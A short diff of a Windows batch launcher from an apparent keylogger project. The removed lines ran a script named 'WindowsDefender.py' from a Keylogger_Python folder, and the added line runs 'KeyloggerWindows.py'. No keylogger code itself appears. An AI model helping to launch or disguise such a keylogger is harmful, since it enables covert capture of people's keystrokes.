@@ -1,5 +1,4 @@
 echo off
-cd O:\OneDrive - xKx\SoftwareProyect\Python\Keylogger_Python
-python WindowsDefender.py
+python KeyloggerWindows.py
 :cmd
 pause null 
